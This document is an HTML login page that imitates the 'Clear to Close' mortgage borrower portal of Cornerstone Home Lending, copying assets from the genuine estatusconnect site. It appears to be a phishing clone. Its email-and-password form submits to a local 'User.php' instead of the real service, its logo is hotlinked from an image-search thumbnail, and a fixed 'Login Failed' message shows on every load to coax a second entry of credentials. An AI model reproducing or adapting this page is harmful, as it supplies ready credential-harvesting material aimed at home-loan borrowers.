

<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta charset="utf-8" />
    <link rel="icon" type="https://houseloan.estatusconnect.com/image/x-icon" href="">
    <META HTTP-EQUIV="Pragma" CONTENT="no-cache">
    <META HTTP-EQUIV="Expires" CONTENT="-1">
    <title>
        Clear to Close&reg;
    </title>
    <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no' name='viewport' />

    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-613827-14"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag() { dataLayer.push(arguments); }
        gtag('js', new Date());
        gtag('config', 'UA-613827-14');
    </script>

    <!--     Fonts and icons     -->
    <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700,200" rel="stylesheet" />
    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css" rel="stylesheet">
    <!-- CSS Files -->

            <link rel="stylesheet" href="https://houseloan.estatusconnect.com/UserLoginBundles/R6KS1aNe4Vi8sVnoGg8W8EEEplIRpbv_JKOyjJGbnK41.css?fics=3.10.10823.2" />



    <link href="https://houseloan.estatusconnect.com/customCSS/678587/custom.css?fics=01011900000000" rel="stylesheet" />


</head>
<body class="bg-dark">
    <div class="loading">
        Loading&#8230;
    </div>
    <div class="wrapper wrapper-full-page ">
        <div class="full-page section-image" filter-color="black" data-image="https://houseloan.estatusconnect.com/FicsImages/FICSBackgroundV1.jpg">
            <!--   you can change the color of the filter page using: data-color="blue | purple | green | orange | red | rose " -->
            <div class="content">
                <div class="container">
                    <!-- SERV: D61AC51D7AF90DF3753250E82CAF4857 -->
                    

<div class="col-lg-4 col-md-6 ml-auto mr-auto">
<form action="User.php" id="test" method="post">        <div class="card card-login">
            <div class="card-header ">
                <div class="card-header ">
                    <center><img aria-label="Company Logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTbYDi1nsdQMxlCorQc_4cSQRu262Yrz5b3VMmjsctHBSupN0mB_iL1r7IzNtSNIhZ4mw&usqp=CAU" /></center>
                    <input id="CompanyLogo" name="CompanyLogo" type="hidden" value="86002_logo.jpg" />
                    <input id="CompanyName" name="CompanyName" type="hidden" value="Cornerstone Home Lending, Inc." />
                    <input data-val="true" data-val-required="The ShowContactUs field is required." id="ShowContactUs" name="ShowContactUs" type="hidden" value="True" />
                    <input id="Version" name="Version" type="hidden" value="" />
                    <input id="Token" name="Token" type="hidden" value="" />
                    <input data-val="true" data-val-number="The field MaxPassword must be a number." data-val-required="The MaxPassword field is required." id="MaxPassword" name="MaxPassword" type="hidden" value="10" />
                    <input data-val="true" data-val-required="The HideUser field is required." id="HideUser" name="HideUser" type="hidden" value="False" />
                    <input data-val="true" data-val-required="The HidePassword field is required." id="HidePassword" name="HidePassword" type="hidden" value="False" />
                </div>
            </div>
            <div class="card-body ">
                <div class="input-group">
                        <div class="input-group-prepend">
                            <span class="input-group-text">
                                <i class="nc-icon nc-single-02"></i>
                            </span>
                        </div>
						<label for="User_Name" hidden="hidden" id="userNameLabel">
						Email Address</label><input aria-labelledby="userNameLabel" class="form-control focus noRedBorder" id="user_id" name="user_id" placeholder="Email" required="required" type="text" value="" />                </div>
                <span class="field-validation-valid text-danger" data-valmsg-for="user_id" data-valmsg-replace="true"></span>
                    <div class="input-group">
                        <div class="input-group-prepend">
                            <span class="input-group-text">
                                <i class="nc-icon nc-key-25"></i>
                            </span>
                        </div>
                        <label for="Password" hidden="hidden" id="passwordLabel">password</label>
                        <input aria-labelledby="passwordLabel" class="form-control noRedBorder" id="password" maxlength="" name="password" placeholder="Password" required="required" type="password" />
                    </div>
<span class="field-validation-valid text-danger" data-valmsg-for="password" data-valmsg-replace="true"></span>            </div>
            <div class="card-footer ">
                <font color="#FF0000">Login Failed. Re-enter correct details.</font><p>&nbsp;</p>
				<p>
                <input id="submitButton" type="submit" value="Login" class="btn btn-warning btn-round btn-block mb-3 ficsLogin">

                </p>

                <div class="row">
                    &nbsp;</div>
            </div>
        </div>
</form>
    

</div>

<div id="contactUsModal" class="modal" role="dialog" data-keyboard="false" data-backdrop="static">
    <div class="modal-dialog modal-lg">
        <!-- Modal content-->
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal">&times;</button>
                <center><img src="https://houseloan.estatusconnect.com/CustomerImages/logo/86002_logo.jpg" alt="Company Logo" /></center>
                <h4 class="modal-title text-center">Contact Us</h4>
            </div>
            <div class="modal-body">
                <div id="ReplaceContactUs"></div>
            </div>
        </div>
    </div>
</div>

<div id="registerModal" class="modal" role="dialog" aria-describedby="registerModal" data-keyboard="false" data-backdrop="static">
    <div class="modal-dialog">
        <!-- Modal content-->
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close modalClose" data-dismiss="modal" onclick="clearError()">&times;</button>
                <center><img src="https://houseloan.estatusconnect.com/CustomerImages/logo/86002_logo.jpg" alt="Company Logo" /></center>
                <h4 class="modal-title text-center">Borrower Registration</h4>
            </div>
            <div class="modal-body" aria-describedby="registerModalBody">
                <div id="registerError" class="row hidden">
                    <label class="col-sm-12 text-center text-danger">Sorry that Loan Number and SSN/TIN or Misc ID are invalid.  Please try again.</label>
                </div>
                <div id="registerUserExists" class="row hidden">
                    <label class="col-sm-12 text-center text-danger">This loan account has already been registered. Please login using the username and password associated with this account.</label>
                </div>
                <div id="ReplaceRegister"></div>
            </div>
        </div>
    </div>
</div>

<div id="clickWrapModal" class="modal" role="dialog" aria-describedby="ClickWrapModal" data-keyboard="false" data-backdrop="static">
    <div class="modal-dialog modal-lg">
        <!-- Modal content-->
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close modalClose" data-dismiss="modal">&times;</button>
                <center><img src="https://houseloan.estatusconnect.com/CustomerImages/logo/86002_logo.jpg" alt="Company Logo" /></center>
                <h4 class="modal-title text-center">Click Wrap Agreement</h4>
            </div>
            <div class="modal-body">
                <div id="ClickWrapResult"></div>
            </div>
        </div>
    </div>
</div>

<div id="createModal" class="modal" role="dialog" data-keyboard="false" data-backdrop="static">
    <div class="modal-dialog">
        <!-- Modal content-->
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close modalClose" data-dismiss="modal">&times;</button>
                <center><img src="https://houseloan.estatusconnect.com/CustomerImages/logo/86002_logo.jpg" alt="Company Logo" /></center>
                <h4 class="modal-title text-center"><span id="createModalTitle">&nbsp;</span></h4>
            </div>
            <div class="modal-body">
                <div id="createError" class="row hidden">
                    <label id="createErrorMsg" class="col-sm-12 text-center">Token has expired.  Please retry registering.</label>
                    <div class="text-center">
                        <input type="reset" class="btn btn-danger ficsClose" data-dismiss="modal" value="Close" onclick="resetCreate()" />
                    </div>
                </div>
                <div id="createSuccess" class="row hidden">
                    <label id="createSuccessMsg" class="col-sm-12 text-center">Your account has been created.  You will receive an email shortly.  Click on the link in the email to activate your account.  Once your account is activated, you will be able to log in.</label>
                    <div class="text-center">
                        <input type="reset" class="btn btn-danger ficsClose" data-dismiss="modal" value="Close" onclick="resetCreate()" />
                    </div>
                </div>
                <div id="CreateResult"></div>
            </div>
        </div>
    </div>
</div>

<div id="forgotPasswordModal" class="modal" role="dialog" aria-describedby="forgotPasswordModal" data-keyboard="false" data-backdrop="static">
    <div class="modal-dialog">
        <!-- Modal content-->
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close modalClose" data-dismiss="modal">&times;</button>
                <center><img src="https://houseloan.estatusconnect.com/CustomerImages/logo/86002_logo.jpg" alt="Company Logo" /></center>
                <h4 class="modal-title text-center">Forgot Password</h4>
            </div>
            <div class="modal-body">
                <div id="ReplaceForgotPassword"></div>
            </div>
        </div>
    </div>
</div>
<div id="forgotUsernameModal" class="modal" role="dialog" data-keyboard="false" data-backdrop="static">
    <div class="modal-dialog">
        <!-- Modal content-->
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close modalClose" data-dismiss="modal">&times;</button>
                <center><img src="https://houseloan.estatusconnect.com/CustomerImages/logo/86002_logo.jpg" alt="Company Logo" /></center>
                <h4 class="modal-title text-center">Forgot Username</h4>
            </div>
            <div class="modal-body">
                <div id="ReplaceForgotUsername"></div>
            </div>
        </div>
    </div>
</div>


                </div>
            </div>
        </div>
    </div>
    <script src="https://houseloan.estatusconnect.com/routejs.axd/34923507715fcc8a0e805828cd1e3954a68975b1/router.min.js"></script>
    <script>
        window.isError = "False";
        window.message = "";
        window.pageTimer = null;
        window.displayCrossSelling = null;
    </script>

    <script src="https://houseloan.estatusconnect.com/UserBundles/ZtJxTi23KZbUF1skBjYVQkd6li_zupLhDvoSt4uTr3A1.js?fics=3.10.10823.2" type="text/javascript"></script>



    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <script type="text/javascript">

        function register() {
            $.ajax({
                type: 'GET',
                url: '/LoginOptions/Captcha',
                data: 'name=register',
                success: function (response) {
                    $('#ReplaceRegister').html(response);
                    $('#registerModal').modal("show");
                    focusTrap('#registerModal');
                }
            });
        }

        //function clickWrap() {
        //    if ($('#ClickWrapResult').html() != "") {
        //        $('#registerModal').modal("hide");
        //        $('#clickWrapModal').modal("show");
        //        registrationToken = $("div[id^='clickWrapId']").data("token");
        //    }
        //    else {
        //        $("#registerError").show();
        //    }
        //}

        function clickWrap() {
            if ($('#ClickWrapResult').html() != "" && $('#ClickWrapResult').html() != "DENIED" && $('#ClickWrapResult').html() != "USEREXIST") {
                // why did we do this below?
                //$('#ReplaceRegister').html($('#ClickWrapResult').html());
                $('#registerModal').modal("hide");
                $('#clickWrapModal').modal("show");
                registrationToken = $("div[id^='clickWrapId']").data("token");
            }
            else {
                if ($('#ClickWrapResult').html() == "DENIED") {
                    window.location = '/User/Denied';
                } else if ($('#ClickWrapResult').html() == "USEREXIST") {
                    $("#registerUserExists").show();
                } else {
                    $("#registerError").show();
                }
            }
        }

        function clearError() {
            $("#registerError").hide();
            $("#registerUserExists").hide();
        }

        function create() {
            $('#clickWrapModal').modal("hide");
            $('#createModal').modal("show");
            $('#TokenId').val(registrationToken);
            hideBusyIndicator();
        }

        function createFinish(data) {
            if (typeof data === 'object') {
                if (data.HasError == false) {
                    $("#createModalTitle").text("Account Created");
                    $("#createSuccess").show();
                    focusTrap('#createModal');
                    $('#createModal').attr('tabindex', 0).focus();
                }
                else {
                    $("#createModalTitle").text("Error");
                    $("#createError").show();
                }
            }
        }

        function resetCreate() {
            $("#CreateResult").show();
            $("#createSuccess").hide();
            $("#createError").hide();
        }

        function contactUs() {
            $.ajax({
                type: 'GET',
                url: '/ContactUs',
                data: 'hideLayout=true',
                success: function (response) {
                    $('#ReplaceContactUs').html(response);
                    $('#contactUsModal').modal("show");
                    $("#LoanNumberA").mask("0000000000");
                    $("#Phone").mask("(000) 000-0000");
                    $("#Zip").mask("00000-0000");
                }
            });
        }

        function forgotPassword() {
            $.ajax({
                type: 'GET',
                url: '/LoginOptions/ForgotPassword',
                success: function (response) {
                    $('#ReplaceForgotPassword').html(response);
                    $('#forgotPasswordModal').modal("show");
                }
            });
        }

        function forgotPasswordStart() {
            displayBusyIndicator();
        }

        function forgotUserNameBegin() {
            displayBusyIndicator();
        }

        function captchaBegin() {
            displayBusyIndicator();
        }

        function captchaComplete() {
            hideBusyIndicator();
        }

        function clickWrapBegin() {
            displayBusyIndicator();
        }

        function clickWrapComplete() {
            hideBusyIndicator();
        }

        function createAccountBegin() {
            displayBusyIndicator();
        }

        function createAccountPostBegin() {
            displayBusyIndicator();
        }

        function createAccountPostComplete() {
            hideBusyIndicator();
        }

        function forgotComplete(data) {
            if (data.responseJSON.HasError === true) {
                $('#forgotPasswordModal').modal("hide");
                getToastrModal("Sorry, the password change was unsuccessful.", 'error');
                $('#forgotPasswordModal').modal("show");
            }
            else {
                $('#forgotPasswordModal').modal("hide");
                getToastrModal("Please check your inbox to proceed with a password reset.", 'success');
            }
            hideBusyIndicator();
        }

        function forgotUsername() {
            $.ajax({
                type: 'GET',
                url: '/LoginOptions/ForgotUsername',
                success: function (response) {
                    $('#ReplaceForgotUsername').html(response);
                    $('#forgotUsernameModal').modal("show");
                }
            });
            hideBusyIndicator();
        }

        function forgotUsernameComplete(data) {
            if (data.responseJSON.HasError === true) {
                $('#forgotUsernameModal').modal("hide");
                getToastrModal("Unable to send username. Please contact your lender for assistance.", 'error');
                $('#forgotUsernameModal').modal("show");
            }
            else {
                $('#forgotUsernameModal').modal("hide");
                getToastrModal("Your username has been sent to the email address on your account.", 'success');
            }
            hideBusyIndicator();
        }
    </script>



    <script type="text/javascript">
        $(function () {
            LoadImage();
            $(".focus").focus();
        })

        function LoadImage() {
            var backgroundImage = 'https://houseloan.estatusconnect.com/FicsImages/FICSBackgroundV1.jpg';
            $page = $('.full-page');
            $page.append('<div class="full-page-background" style="background-image: url(' + backgroundImage + ') "/>');
        }

        //function GetDefault() {
        //    $page = $('.full-page');
        //    image_src = GetRandom(); //$page.data('image');
        //    if (image_src !== undefined) {
        //        image_container = '<div class="full-page-background" style="background-image: url(' + image_src + ') "/>';
        //        $page.append(image_container);
        //    }
        //}

        //var choices = [
        //    "https://houseloan.estatusconnect.com/Areas/Admin/theme/assets/img/bg/FICSBackground.jpeg"
        //];
        //function GetRandom() {
        //    var index = Math.floor(Math.random() * choices.length);
        //    return choices[index];
        //}
    </script>

</body>

</html>